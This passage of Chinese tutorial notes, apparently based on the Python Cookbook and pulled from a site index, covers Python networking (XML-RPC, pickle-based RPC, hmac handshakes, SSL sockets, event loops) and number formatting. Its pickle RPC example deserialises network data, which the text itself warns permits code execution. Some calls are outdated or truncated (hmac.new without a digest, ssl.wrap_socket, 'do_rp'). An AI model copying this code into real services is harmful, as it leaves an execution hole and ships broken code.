12:3456:78:90ab:cd:ef01:23:32 12:3456:78:90ab:cd:ef01:23:33 12:3456:78:90ab:cd:ef01:23:34 12:3456:78:90ab:cd:ef01:23:35 12:3456:78:90ab:cd:ef01:23:36 12:3456:78:90ab:cd:ef01:23:37 >>> Network 也允许像数组一样的索引取值 还可以执行网络成员检查之类的操作: >>> a = ipaddress.ip_address('123.45.67.69') >>> a in net True >>> b = ipaddress.ip_address('123.45.67.123') >>> b in net False 一个 IP 地址和网络地址能通过一个 IP 接口来指定，例如: >>> inet = ipaddress.ip_interface('123.45.67.73/27') >>> inet.network IPv4Network('123.45.67.64/27') >>> inet.ip IPv4Address('123.45.67.73') >>> 讨论 ipaddress 模块有很多类可以表示 IP 地址、网络和接口。当你需要操作网络地址 （比如解析、打印、验证等）的时候会很有用。 要注意的是，ipaddress 模块跟其他一些和网络相关的模块比如 socket 库交集很 少。所以，你不能使用 IPv4Address 的实例来代替一个地址字符串，你首先得显式的 使用 str() 转换它。 创建一个简单的 REST 接口 问题 你想使用一个简单的 REST 接口通过网络远程控制或访问你的应用程序，但是你 又不想自己去安装一个完整的 web 框架。 解决方案 构建一个 REST 风格的接口最简单的方法是创建一个基于 WSGI 标准（PEP 3333）的很小的库. 通过 XML-RPC 实现简单的远程调用 问题 你想找到一个简单的方式去执行运行在远程机器上面的 Python 程序中的函数或方 法 解决方案 实现一个远程方法调用的最简单方式是使用 XML-RPC。下面我们演示一下一个 实现了键-值存储功能的简单服务器: from xmlrpc.server import SimpleXMLRPCServer class KeyValueServer: _rpc_methods_ = ['get', 'set', 'delete', 'exists', 'keys'] def __init__(self, address): self._data = {} self._serv = SimpleXMLRPCServer(address, allow_none=True) for name in self._rpc_methods_: self._serv.register_function(getattr(self, name)) def get(self, name): return self._data[name] def set(self, name, value): self._data[name] = value def delete(self, name): del self._data[name] def exists(self, name): return name in self._data def keys(self): return list(self._data) def serve_forever(self): self._serv.serve_forever() # Example if __name__ == '__main__': kvserv = KeyValueServer(('', 15000)) kvserv.serve_forever() 从一个客户端机器上面来访问服务器: >>> from xmlrpc.client import ServerProxy >>> s = ServerProxy('http://localhost:15000', allow_none=True) >>> s.set('foo', 'bar') >>> s.set('spam', [1, 2, 3]) >>> s.keys() ['spam', 'foo'] >>> s.get('foo') 'bar' >>> s.get('spam') [1, 2, 3] >>> s.delete('spam') >>> s.exists('spam') False >>> 讨论 XML-RPC 可以让我们很容易的构造一个简单的远程调用服务。你所需要做的仅 仅是创建一个服务器实例，通过它的方法 register_function() 来注册函数，然后使 用方法 serve_forever() 启动它。在上面我们将这些步骤放在一起写到一个类中，不 够这并不是必须的。比如你还可以像下面这样创建一个服务器: from xmlrpc.server import SimpleXMLRPCServer def add(x,y): return x+y serv = SimpleXMLRPCServer(('', 15000)) serv.register_function(add) serv.serve_forever() XML-RPC 暴露出来的函数只能适用于部分数据类型，比如字符串、整形、列表和 字典。对于其他类型就得需要做些额外的功课了。例如，如果你想通过 XML-RPC 传 递一个对象实例，实际上只有他的实例字典被处理. 类似的，对于二进制数据的处理也跟你想象的不太一样: >>> s.set('foo', b'Hello World') >>> s.get('foo') <xmlrpc.client.Binary object at 0x10131d410> >>> _.data b'Hello World' >>> 一般来讲，你不应该将 XML-RPC 服务以公共 API 的方式暴露出来。对于这种情 况，通常分布式应用程序会是一个更好的选择。 XML-RPC 的一个缺点是它的性能。SimpleXMLRPCServer 的实现是单线程的，所 以它不适合于大型程序 另外，由于 XML-RPC 将所有数据都序列化为 XML 格式，所以它会比其他的方式运 行的慢一些。但是它也有优点，这种方式的编码可以被绝大部分其他编程语言支持。通 过使用这种方式，其他语言的客户端程序都能访问你的服务。 虽然 XML-RPC 有很多缺点，但是如果你需要快速构建一个简单远程过程调用系 统的话，它仍然值得去学习的。有时候，简单的方案就已经足够了。 在不同的 Python 解释器之间交互 问题 你在不同的机器上面运行着多个 Python 解释器实例，并希望能够在这些解释器之 间通过消息来交换数据。 解决方案 通过使用 multiprocessing.connection 模块可以很容易的实现解释器之间的通 信。下面是一个简单的应答服务器例子: from multiprocessing.connection import Listener import traceback def echo_client(conn): try: while True: msg = conn.recv() conn.send(msg) except EOFError: print('Connection closed') def echo_server(address, authkey): serv = Listener(address, authkey=authkey) while True: try: client = serv.accept() echo_client(client) except Exception: traceback.print_exc() echo_server(('', 25000), authkey=b'peekaboo') 然后客户端连接服务器并发送消息的简单示例: >>> from multiprocessing.connection import Client >>> c = Client(('localhost', 25000), authkey=b'peekaboo') >>> c.send('hello') >>> c.recv() 'hello' >>> c.send([1, 2, 3, 4, 5]) >>> c.recv() [1, 2, 3, 4, 5] >>> 跟底层 socket 不同的是，每个消息会完整保存（每一个通过 send() 发送的对象能 通过 recv() 来完整接受）。另外，所有对象会通过 pickle 序列化。因此，任何兼容 pickle 的对象都能在此连接上面被发送和接受。 讨论 目前有很多用来实现各种消息传输的包和函数库，比如 ZeroMQ、Celery 等。你还 有另外一种选择就是自己在底层 socket 基础之上来实现一个消息传输层。但是你想要 简单一点的方案，那么这时候 multiprocessing.connection 就派上用场了。仅仅使用 一些简单的语句即可实现多个解释器之间的消息通信。 如果你的解释器运行在同一台机器上面，那么你可以使用另外的通信机制，比如 Unix 域套接字或者是 Windows 命名管道。要想使用 UNIX 域套接字来创建一个连接， 只需简单的将地址改写一个文件名即可: s = Listener('/tmp/myconn', authkey=b'peekaboo') 要想使用 Windows 命名管道来创建连接，只需像下面这样使用一个文件名: s = Listener(r'\\\\.\\pipe\\myconn', authkey=b'peekaboo') 一个通用准则是，你不要使用 multiprocessing 来实现一个对外的公共服务。 Client() 和 Listener() 中的 authkey 参数用来认证发起连接的终端用户。如果密钥 不对会产生一个异常。此外，该模块最适合用来建立长连接（而不是大量的短连接）， 例如，两个解释器之间启动后就开始建立连接并在处理某个问题过程中会一直保持连 接状态。 如果你需要对底层连接做更多的控制，比如需要支持超时、非阻塞 I/O 或其他类 似的特性，你最好使用另外的库或者是在高层 socket 上来实现这些特性。 实现远程方法调用 问题 你想在一个消息传输层如 sockets 、multiprocessing connections 或 ZeroMQ 的 基础之上实现一个简单的远程过程调用（RPC）。 解决方案 将函数请求、参数和返回值使用 pickle 编码后，在不同的解释器直接传送 pickle 字 节字符串，可以很容易的实现 RPC。下面是一个简单的 PRC 处理器，可以被整合到一 个服务器中去: # rpcserver.py import pickle class RPCHandler: def __init__(self): self._functions = { } def register_function(self, func): self._functions[func.__name__] = func def handle_connection(self, connection): try: while True: # Receive a message func_name, args, kwargs = pickle.loads(connection.recv()) # Run the RPC and send a response try: r = self._functions[func_name](*args,**kwargs) connection.send(pickle.dumps(r)) except Exception as e: connection.send(pickle.dumps(e)) except EOFError: pass 要使用这个处理器，你需要将它加入到一个消息服务器中。你有很多种选择，但是 使用 multiprocessing 库是最简单的。下面是一个 RPC 服务器例子: from multiprocessing.connection import Listener from threading import Thread def rpc_server(handler, address, authkey): sock = Listener(address, authkey=authkey) while True: client = sock.accept() t = Thread(target=handler.handle_connection, args=(client,)) t.daemon = True t.start() # Some remote functions def add(x, y): return x + y def sub(x, y): return x - y # Register with a handler handler = RPCHandler() handler.register_function(add) handler.register_function(sub) # Run the server rpc_server(handler, ('localhost', 17000), authkey=b'peekaboo') 为了从一个远程客户端访问服务器，你需要创建一个对应的用来传送请求的 RPC 代理类。例如: import pickle class RPCProxy: def __init__(self, connection): self._connection = connection def __getattr__(self, name): def do_rpc(*args, **kwargs): self._connection.send(pickle.dumps((name, args, kwargs))) result = pickle.loads(self._connection.recv()) if isinstance(result, Exception): raise result return result return do_rp 要使用这个代理类，你需要将其包装到一个服务器的连接上面，例如: >>> from multiprocessing.connection import Client >>> c = Client(('localhost', 17000), authkey=b'peekaboo') >>> proxy = RPCProxy(c) >>> proxy.add(2, 3) 5 >>> proxy.sub(2, 3) -1 >>> proxy.sub([1, 2], 4) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"rpcserver.py\", line 37, in do_rpc raise result TypeError: unsupported operand type(s) for -: 'list' and 'int' >>> 要注意的是很多消息层（比如 multiprocessing ）已经使用 pickle 序列化了数据。 如果是这样的话，对 pickle.dumps() 和 pickle.loads() 的调用要去掉。 讨论 由于底层需要依赖 pickle，那么安全问题就需要考虑了（因为一个聪明的黑客可以 创建特定的消息，能够让任意函数通过 pickle 反序列化后被执行）。因此你永远不要允 许来自不信任或未认证的客户端的 RPC。特别是你绝对不要允许来自 Internet 的任意 机器的访问，这种只能在内部被使用，位于防火墙后面并且不要对外暴露。 实现 RPC 的一个比较复杂的问题是如何去处理异常。至少，当方法产生异常时服 务器不应该奔溃。因此，返回给客户端的异常所代表的含义就要好好设计了。如果你使 用 pickle，异常对象实例在客户端能被反序列化并抛出。如果你使用其他的协议，那得 想想另外的方法了。不过至少，你应该在响应中返回异常字符串。 简单的客户端认证 问题 你想在分布式系统中实现一个简单的客户端连接认证功能，又不想像 SSL 那样的 复杂。 解决方案 可以利用 hmac 模块实现一个连接握手，从而实现一个简单而高效的认证过程。下 面是代码示例: import hmac import os def client_authenticate(connection, secret_key): ''' Authenticate client to a remote service. connection represents a network connection. secret_key is a key known only to both client/server. ''' message = connection.recv(32) hash = hmac.new(secret_key, message) digest = hash.digest() connection.send(digest) def server_authenticate(connection, secret_key): ''' Request client authentication. ''' message = os.urandom(32) connection.send(message) hash = hmac.new(secret_key, message) digest = hash.digest() response = connection.recv(len(digest)) return hmac.compare_digest(digest,response) 基本原理是当连接建立后，服务器给客户端发送一个随机的字节消息（这里例子 中使用了 os.urandom() 返回值）。客户端和服务器同时利用 hmac 和一个只有双方知 道的密钥来计算出一个加密哈希值。然后客户端将它计算出的摘要发送给服务器，服务 器通过比较这个值和自己计算的是否一致来决定接受或拒绝连接。摘要的比较需要使 用 hmac.compare_digest() 函数。使用这个函数可以避免遭到时间分析攻击，不要用 简单的比较操作符（==）。为了使用这些函数，你需要将它集成到已有的网络或消息 代码中。 讨论 hmac 认证的一个常见使用场景是内部消息通信系统和进程间通信。例如，如果你 编写的系统涉及到一个集群中多个处理器之间的通信，你可以使用本节方案来确保只 有被允许的进程之间才能彼此通信。事实上，基于 hmac 的认证被 multiprocessing 模 块使用来实现子进程直接的通信。 还有一点需要强调的是连接认证和加密是两码事。认证成功之后的通信消息是以 明文形式发送的，任何人只要想监听这个连接线路都能看到消息（尽管双方的密钥不 会被传输） hmac 认证算法基于哈希函数如 MD5 和 SHA-1， 在网络服务中加入 SSL 问题 你想实现一个基于 sockets 的网络服务，客户端和服务器通过 SSL 协议认证并加 密传输的数据。 解决方案 ssl 模块能为底层 socket 连接添加 SSL 的支持。ssl.wrap_socket() 函数接受一 个已存在的 socket 作为参数并使用 SSL 层来包装它。例如，下面是一个简单的应答服 务器，能在服务器端为所有客户端连接做认证。 例子: from socket import socket, AF_INET, SOCK_STREAM import ssl KEYFILE = 'server_key.pem' # Private key of the server CERTFILE = 'server_cert.pem' # Server certificate (given to client) def echo_client(s): while True: data = s.recv(8192) if data == b'': break s.send(data) s.close() print('Connection closed') def echo_server(address): s = socket(AF_INET, SOCK_STREAM) s.bind(address) s.listen(1) # Wrap with an SSL layer requiring client certs s_ssl = ssl.wrap_socket(s, keyfile=KEYFILE, certfile=CERTFILE, server_side=True ) # Wait for connections while True: try: c,a = s_ssl.accept() print('Got connection', c, a) echo_client(c) except Exception as e: print('{}: {}'.format(e.__class__.__name__, e)) echo_server(('', 20000)) 客户端连接服务器: >>> from socket import socket, AF_INET, SOCK_STREAM >>> import ssl >>> s = socket(AF_INET, SOCK_STREAM) >>> s_ssl = ssl.wrap_socket(s, cert_reqs=ssl.CERT_REQUIRED, ca_certs = 'server_cert.pem') >>> s_ssl.connect(('localhost', 20000)) >>> s_ssl.send(b'Hello World?') 12 >>> s_ssl.recv(8192) b'Hello World?' >>> 这种直接处理底层 socket 方式有个问题就是它不能很好的跟标准库中已存在的 网络服务兼容。例如，绝大部分服务器代码（HTTP、XML-RPC 等）实际上是基于 socketserver 库的。客户端代码在一个较高层上实现。我们需要另外一种稍微不同的 方式来将 SSL 添加到已存在的服务中 创建自签名证书: openssl req -new -x509 -days 365 -nodes -out server_cert.pem -keyout server_key.pem 在创建证书的时候，各个值的设定可以是任意的，但是\"Common Name\"的值通 常要包含服务器的 DNS 主机名。如果你只是在本机测试，那么就使用\"localhost\"，否 则使用服务器的域名。 进程间传递 Socket 文件描述符 问题 你有多个 Python 解释器进程在同时运行，你想将某个打开的文件描述符从一个解 释器传递给另外一个。比如，假设有个服务器进程相应连接请求，但是实际的相应逻辑 是在另一个解释器中执行的。 解决方案 为了在多个进程中传递文件描述符，你首先需要将它们连接到一起。在 Unix 机器 上，你可能需要使用 Unix 域套接字，而在 windows 上面你需要使用命名管道。不过你 无需真的需要去操作这些底层，通常使用 multiprocessing 模块来创建这样的连接会 更容易一些。 一 旦 一 个 连 接 被 创 建， 你 可 以 使 用 multiprocessing.reduction 中 的 send_handle() 和 recv_handle() 函数在不同的处理器直接传递文件描述符。下面 的例子演示了最基本的用法: import multiprocessing from multiprocessing.reduction import recv_handle, send_handle import socket def worker(in_p, out_p): out_p.close() while True: fd = recv_handle(in_p) print('CHILD: GOT FD', fd) with socket.socket(socket.AF_INET, socket.SOCK_STREAM, fileno=fd) as s: while True: msg = s.recv(1024) if not msg: break print('CHILD: RECV {!r}'.format(msg)) s.send(msg) def server(address, in_p, out_p, worker_pid): in_p.close() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True) s.bind(address) s.listen(1) while True: client, addr = s.accept() print('SERVER: Got connection from', addr) send_handle(out_p, client.fileno(), worker_pid) client.close() if __name__ == '__main__': c1, c2 = multiprocessing.Pipe() worker_p = multiprocessing.Process(target=worker, args=(c1,c2)) worker_p.start() server_p = multiprocessing.Process(target=server, args=(('', 15000), c1, c2, worker_p.pid)) server_p.start() c1.close() c2.close() 在这个例子中，两个进程被创建并通过一个 multiprocessing 管道连接起来。服 务器进程打开一个 socket 并等待客户端连接请求。工作进程仅仅使用 recv_handle() 在管道上面等待接收一个文件描述符。当服务器接收到一个连接，它将产生的 socket 文件描述符通过 send_handle() 传递给工作进程。工作进程接收到 socket 后向客户端 回应数据，然后此次连接关闭。 讨论 对于大部分程序员来讲在不同进程之间传递文件描述符好像没什么必要。但是，有 时候它是构建一个可扩展系统的很有用的工具。例如，在一个多核机器上面，你可以有 多个 Python 解释器实例，将文件描述符传递给其它解释器来实现负载均衡。 send_handle() 和 recv_handle() 函数只能够用于 multiprocessing 连接。 理解事件驱动的 IO 问题 你应该已经听过基于事件驱动或异步 I/O 的包，但是你还不能完全理解它的底层 到底是怎样工作的，或者是如果使用它的话会对你的程序产生什么影响。 解决方案 事件驱动 I/O 本质上来讲就是将基本 I/O 操作（比如读和写）转化为你程序需要 处理的事件。例如，当数据在某个 socket 上被接受后，它会转换成一个 receive 事件， 然后被你定义的回调方法或函数来处理。作为一个可能的起始点，一个事件驱动的框架 可能会以一个实现了一系列基本事件处理器方法的基类开始: class EventHandler: def fileno(self): 'Return the associated file descriptor' raise NotImplemented('must implement') def wants_to_receive(self): 'Return True if receiving is allowed' return False def handle_receive(self): 'Perform the receive operation' pass def wants_to_send(self): 'Return True if sending is requested' return False def handle_send(self): 'Send outgoing data' pass 这个类的实例作为插件被放入类似下面这样的事件循环中: import select def event_loop(handlers): while True: wants_recv = [h for h in handlers if h.wants_to_receive()] wants_send = [h for h in handlers if h.wants_to_send()] can_recv, can_send, _ = select.select(wants_recv, wants_send, []) for h in can_recv: h.handle_receive() for h in can_send: h.handle_send() 事件循环的关键部分是 select() 调用，它会不断轮询文件描述符从而激活它。在 调用 select() 之前，时间循环会询问所有的处理器来决定哪一个想接受或发生。然后 它将结果列表提供给 select() 。然后 select() 返回准备接受或发送的对象组成的列 表。然后相应的 handle_receive() 或 handle_send() 方法被触发。 讨论 实际上所有的事件驱动框架原理跟上面的例子相差无几。实际的实现细节和软件 架构可能不一样，但是在最核心的部分，都会有一个轮询的循环来检查活动 socket，并 执行响应操作. 事件驱动 I/O 的一个可能好处是它能处理非常大的并发连接，而不需要使用多线 程或多进程。也就是说，select() 调用（或其他等效的）能监听大量的 socket 并响应 它们中任何一个产生事件的。在循环中一次处理一个事件，并不需要其他的并发机制。 事件驱动 I/O 的缺点是没有真正的同步机制。如果任何事件处理器方法阻塞或执 行一个耗时计算，它会阻塞所有的处理进程。调用那些并不是事件驱动风格的库函数也 会有问题，同样要是某些库函数调用会阻塞，那么也会导致整个事件循环停止。 对于阻塞或耗时计算的问题可以通过将事件发送个其他单独的线程或进程来处理。 不过，在事件循环中引入多线程和多进程是比较棘手的，下面的例子演示了如何使用 concurrent.futures 模块来实现: self.pool = ThreadPoolExecutor(nworkers) r = self.pool.submit(func, *args, **kwargs) r.add_done_callback(lambda r: self._complete(callback, r)) 工作被提交给 ThreadPoolExecutor 实例。不过一个难点是协调计算结果和事件循环: # Callback that executes when the thread is done def _complete(self, callback, r): self.pending.append((callback, r.result())) self.signal_done_sock.send(b'x') 发送与接收大型数组 问题 你要通过网络连接发送和接受连续数据的大型数组，并尽量减少数据的复制操作 解决方案 下面的函数利用 memoryviews 来发送和接受大数组: # zerocopy.py def send_from(arr, dest): view = memoryview(arr).cast('B') while len(view): nsent = dest.send(view) view = view[nsent:] def recv_into(arr, source): view = memoryview(arr).cast('B') while len(view): nrecv = source.recv_into(view) view = view[nrecv:] 讨论 在数据密集型分布式计算和平行计算程序中，自己写程序来实现发送/接受大量数 据并不常见。不过，要是你确实想这样做，你可能需要将你的数据转换成原始字节，以 便给低层的网络函数使用。你可能还需要将数据切割成多个块，因为大部分和网络相关 的函数并不能一次性发送或接受超大数据块。 一种方法是使用某种机制序列化数据——可能将其转换成一个字节字符串。不过， 这样最终会创建数据的一个复制。就算你只是零碎的做这些，你的代码最终还是会有大 量的小型复制操作。 本质上，一个内存视图就是一个已存 在数组的覆盖层。内存视图还能以不同的方式转换成不同类型来表现数据: view = memoryview(arr).cast('B') 它接受一个数组 arr 并将其转换为一个无符号字节的内存视图。这个视图能被传递 给 socket 相关函数，比如 socket.send() 或 send.recv_into() 。在内部，这些方法 能够直接操作这个内存区域。例如，sock.send() 直接从内存中发生数据而不需要复 制。send.recv_into() 使用这个内存区域作为接受操作的输入缓冲区 剩下的一个难点就是 socket 函数可能只操作部分数据。通常来讲，我们得使用很 多不同的 send() 和 recv_into() 来传输整个数组。不用担心，每次操作后，视图会通 过发送或接受字节数量被切割成新的视图。新的视图同样也是内存覆盖层。因此，还是 没有任何的复制操作. 这里有个问题就是接受者必须事先知道有多少数据要被发送，以便它能预分配一 个数组或者确保它能将接受的数据放入一个已经存在的数组中。如果没办法知道的话， 发送者就得先将数据大小发送过来，然后再发送实际的数组数据。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Network-and-web-programming.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Network-and-web-programming.html"},{"title":"数字/日期/时间","text":"数字的四舍五入 round(value, ndigits), 不过当取数的值为5时有点特殊, 见 /docs/后端/python/内置函数/round 当一个值刚好在两个边界的中间的时候，round 函数返回离它最近的偶数。也就是 说，对 1.5 或者 2.5 的舍入运算都会得到 2。 传给 round() 函数的 ndigits 参数可以是负数，这种情况下，舍入运算会作用在 十位、百位、千位等上面。比如: >>> a = 1627731 >>> round(a, -1) 1627730 >>> round(a, -2) 1627700 >>> round(a, -3) 1628000 >>> 如果你的目的只是简单的输出一定宽度的数， 你不需要使用 round() 函数。而仅仅只需要在格式化的时候指定精度即可: >>> x = 1.23456 >>> format(x, '0.2f') '1.23' >>> format(x, '0.3f') '1.235' >>> 'value is {:0.3f}'.format(x) 'value is 1.235' >>> 不要试着去舍入浮点值来\"修正\"表面上看起来正确的问题。比如，你可能 倾向于这样做: >>> a = 2.1 >>> b = 4.2 >>> c = a + b >>> c 6.300000000000001 >>> c = round(c, 2) # \"Fix\" result (???) >>> c 6.3 >>> 对于大多数使用到浮点的程序，没有必要也不推荐这样做。 尽管在计算的时候会有 一点点小的误差，但是这些小的误差是能被理解与容忍的。 如果不能允许这样的小误差 (比如涉及到金融领域)，那么就得考虑使用 decimal 模块了 精确的浮点数运算 decimal math 需要对浮点数执行精确的计算操作，并且不希望有任何小误差的出现 浮点数的一个普遍问题是它们并不能精确的表示十进制数。并且，即使是最简单的 数学运算也会产生小的误差，比如: >>> a = 4.2 >>> b = 2.1 >>> a + b 6.300000000000001 >>> (a + b) == 6.3 False >>> 这些错误是由底层 CPU 和 IEEE 754 标准通过自己的浮点单位去执行算术时的特 征。 由于 Python 的浮点数据类型使用底层表示存储数据，因此你没办法去避免这样的 误差。 如果你想更加精确 (并能容忍一定的性能损耗)，你可以使用 decimal 模块: >>> from decimal import Decimal >>> a = Decimal('4.2') >>> b = Decimal('2.1') >>> a + b Decimal('6.3') >>> print(a + b) 6.3 >>> (a + b) == Decimal('6.3') True 有个看起来比较奇怪的是 用字符串来表示数字. decimal 模块的一个主要特征是允许你控制计算的每一方面，包括数字位数和四 舍五入运算。 为了这样做，你先得创建一个本地上下文并更改它的设置: >>> from decimal import localcontext >>> a = Decimal('1.3') >>> b = Decimal('1.7') >>> print(a / b) 0.7647058823529411764705882353 >>> with localcontext() as ctx: ... ctx.prec = 3 ... print(a / b) ... 0.765 >>> with localcontext() as ctx: ... ctx.prec = 50 ... print(a / b) ... 0.76470588235294117647058823529411764705882352941176 >>> 新手会倾向于使用 decimal 模块来处理浮点数的精确运算。 然而，先理解 你的应用程序目的是非常重要的。 如果你是在做科学计算或工程领域的计算、电脑绘 图，或者是科学领域的大多数运算，那么使用普通的浮点类型是比较普遍的做法。 其中 一个原因是，在真实世界中很少会要求精确到普通浮点数能提供的 17 位精度。 因此， 计算过程中的那么一点点的误差是被允许的。 第二点就是，原生的浮点数计算要快的 多-有时候你在执行大量运算的时候速度也是非常重要的。 即便如此，你却不能完全忽略误差。 数学家花了大量时间去研究各类算法，有些处 理误差会比其他方法更好。你也得注意下减法删除以及大数和小数的加分运算所带来 的影响。比如: >>> nums = [1.23e+18, 1, -1.23e+18] >>> sum(nums) # Notice how 1 disappears 0.0 >>> 上面的错误可以利用 math.fsum() 所提供的更精确计算能力来解决: >>> import math >>> math.fsum(nums) 1.0 >>> math详情见: /docs/后端/python/python标准库/math 然而，对于其他的算法，你应该仔细研究它并理解它的误差产生来源。 总的来说，decimal 模块主要用在涉及到金融的领域。 在这类程序中，哪怕是一点 小小的误差在计算过程中蔓延都是不允许的。 因此，decimal 模块为解决这类问题提供 了方法。 当 Python 和数据库打交道的时候也通常会遇到 Decimal 对象，并且，通常也 是在处理金融数据的时候。 数字的格式化输出 将数字格式化后输出，并控制数字的位数、对齐、千位分隔符和其他的细节。 格式化输出单个数字的时候，可以使用内置的 format() 函数: >>> x = 1234.56789 >>> # Two decimal places of accuracy >>> format(x, '0.2f') '1234.57' >>> # 右对齐10个字符，一位数精度 >>> format(x, '>10.1f') ' 1234.6' >>> # Left justified >>> format(x, '<10.1f') '1234.6 ' >>> # Centered >>> format(x, '&#94;10.1f') ' 1234.6 ' >>> # Inclusion of thousands separator >>> format(x, ',') '1,234.56789' >>> format(x, '0,.1f') '1,234.6' >>> 使用指数记法，将 f 改成 e 或者 E(取决于指数输出的大小写形式): >>> format(x, 'e') '1.234568e+03' >>> format(x, '0.2E') '1.23E+03' >>> 同时指定宽度和精度的一般形式是 '[<>&#94;]?width[,]?(.digits)?' ， 其中 width 和 digits 为整数，?代表可选部分。 同样的格式也被用在字符串的 format() 方法中: >>> 'The value is {:0,.2f}'.format(x) 'The value is 1,234.57' >>> 数字格式化输出通常是比较简单的。上面演示的技术同时适用于浮点数和decimal 模块中的 Decimal 数字对象。 当指定数字的位数后，结果值会根据 round() 函数同样的规则进行四舍五入后返 回: >>> x 1234.56789 >>> format(x, '0.1f') '1234.6' >>> format(-x, '0.1f') '-1234.6' >>> 包含千位符的格式化跟本地化没有关系。如果你需要根据地区来显示千位符，你 需要自己去调查下 locale 模块中的函数了。 同样也可以使用字符串的 translate() 方法来交换千位符: >>> swap_separators = { ord('.'):',', ord(','):'.' } >>> format(x, ',').translate(swap_separators) '1.234,56789' >>> 使用 % 来格式化数字也是可行的，不过比更加先进的 format() 要差一点。 比如，在使 用 % 操作符格式化数字的时候，一些特性 (添加千位符) 并不能被支持: >>> '%0.2f' % x '1234.57' >>> '%10.1f' % x ' 1234.6' >>> '%-10.1f' % x '1234.6 ' >>> 二/八/十六进制整数 需要转换或者输出使用二进制，八进制或十六进制表示的整数 bin, 十进制整数转二进制: >>> x = 1234 >>> bin(x) '0b10011010010' oct, 十进制整数转八进制: >>> oct(x) '0o2322' hex, 十进制整数转十六进制:: >>> hex(x) '0x4d2' >>> 如果你不想输出 0b , 0o 或者 0x 的前缀的话，可以使用 format() 函数: >>> format(x, 'b') '10011010010' >>> format(x, 'o') '2322' >>> format(x, 'x') '4d2' >>> 如果你想产生一个无符号值，你需要增加一个指示最大位长度的值。比如为了显示 32 位的值: >>> x = -1234 >>> format(2**32 + x, 'b') '11111111111111111111101100101110' >>> format(2**32 + x, 'x') 'fffffb2e' >>> 为了以不同的进制转换整数字符串，简单的使用带有进制的 int() 函数: >>> int('4d2', 16) 1234 >>> int('10011010010', 2) 1234 >>> Python 指定八进制数的语法跟其 他语言稍有不同。比如，如果你像下面这样指定八进制，会出现语法错误: >>> import os >>> os.chmod('script.py', 0755) File \"<stdin>\", line 1 os.chmod('script.py', 0755) &#94; SyntaxError: invalid token >>> 需确保八进制数的前缀是 0o os.chmod('script.py', 0o755) 字节到大整数的打包与解包 有一个字节字符串并想将它解压成一个整数。或者，你需要将一个大整数转换为 一个字节字符串。 将 bytes 解析为整数，使用 int.from_bytes() 方法，并像下面这样指定字节 顺序: # 128 bit , 16 元素 data = b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004' >>> len(data) 16 >>> int.from_bytes(data, 'little') 69120565665751139577663547927094891008 >>> int.from_bytes(data, 'big') 94522842520747284487117727783387188 >>> 了将一个大整数转换为一个字节字符串，使用 int.to_bytes() 方法，并像下面 这样指定字节数和字节顺序: >>> x = 94522842520747284487117727783387188 >>> x.to_bytes(16, 'big') b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004' >>> x.to_bytes(16, 'little') b'4\\x00#\\x00\\x01\\xef\\xcd\\x00\\xab\\x90x\\x00V4\\x12\\x00' >>> 大整数和字节字符串之间的转换操作并不常见。 然而，在一些应用领域有时候也会 出现，比如密码学或者网络。 例如，IPv6 网络地址使用一个 128 位的整数表示。 如果 你要从一个数据记录中提取这样的值的时候，你就会面对这样的问题。 作为一种替代方案，你可能想使用 struct 模块来解压字节。 这样也行得通，不过利用 struct 模块来解压对于整数的大小是有限制的。 因此，你可 能想解压多个字节串并将结果合并为最终的结果: >>> data b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004' >>> import struct >>> hi, lo = struct.unpack('>QQ', data) >>> (hi << 64) + lo 94522842520747284487117727783387188 >>> 字节顺序规则 (little 或 big) 仅仅指定了构建整数时的字节的低位高位排列方式。 我们从下面精心构造的 16 进制数的表示中可以很容易的看出来: >>> x = 0x01020304 >>> x.to_bytes(4, 'big') b'\\x01\\x02\\x03\\x04' >>> x.to_bytes(4, 'little') b'\\x04\\x03\\x02\\x01' >>> 如果你试着将一个整数打包为字节字符串，那么它就不合适了，你会得到一个错 误。 如果需要的话，你可以使用 int.bit_length() 方法来决定需要多少字节位来存储 这个值。: >>> x = 523 ** 23 >>> x 335381300113661875107536852714019056160355655333978849017944067 >>> x.to_bytes(16, 'little') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> OverflowError: int too big to convert >>> x.bit_length() 208 >>> nbytes, rem = divmod(x.bit_length(), 8) >>> if rem: ... nbytes += 1 ... >>> >>> x.to_bytes(nbytes, 'little') b'\\x03X\\xf1\\x82iT\\x96\\xac\\xc7c\\x16\\xf3\\xb9\\xcf...\\xd0' >>> 复数 复数可以用使用函数 complex(real, imag) 或者是带有后缀 j 的浮点数来指定: >>> a = complex(2, 4) >>> b = 3 - 5j >>> a (2+4j) >>> b (3-5j) >>> 对应的实部、虚部和共轭复数可以很容易的获取: >>> a.real 2.0 >>> a.imag 4.0 >>> a.conjugate() (2-4j) >>> 所有常见的数学运算: >>> a + b (5-1j) >>> a * b (26+2j) >>> a / b (-0.4117647058823529+0.6470588235294118j) >>> abs(a) 4.47213595499958 >>> 如果要执行其他的复数函数比如正弦、余弦或平方根，使用 /docs/后端/python/python标准库/cmath 模块: >>> import cmath >>> cmath.sin(a) (24.83130584894638-11.356612711218174j) >>> cmath.cos(a) (-11.36423470640106-24.814651485634187j) >>> cmath.exp(a) (-4.829809383269385-5.5920560936409816j) >>> Python 中大部分与数学相关的模块都能处理复数。 比如使用 /docs/后端/python/python三方库/numpy ，可以 很容易的构造一个复数数组并在这个数组上执行各种操作: >>> import numpy as np >>> a = np.array([2+3j, 4+5j, 6-7j, 8+9j]) >>> a array([ 2.+3.j, 4.+5.j, 6.-7.j, 8.+9.j]) >>> a + 2 array([ 4.+3.j, 6.+5.j, 8.-7.j, 10.+9.j]) >>> np.sin(a) array([ 9.15449915 -4.16890696j, -56.16227422 -48.50245524j, -153.20827755-526.47684926j, 4008.42651446-589.49948373j]) >>> Python 的标准数学函数确实情况下并不能产生复数值，因此你的代码中不可能会 出现复数返回值: >>> import math >>> math.sqrt(-1) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: math domain error >>> 如果你想生成一个复数返回结果，你必须显示的使用 cmath 模块，或者在某个支 持复数的库中声明复数类型的使用: >>> import cmath 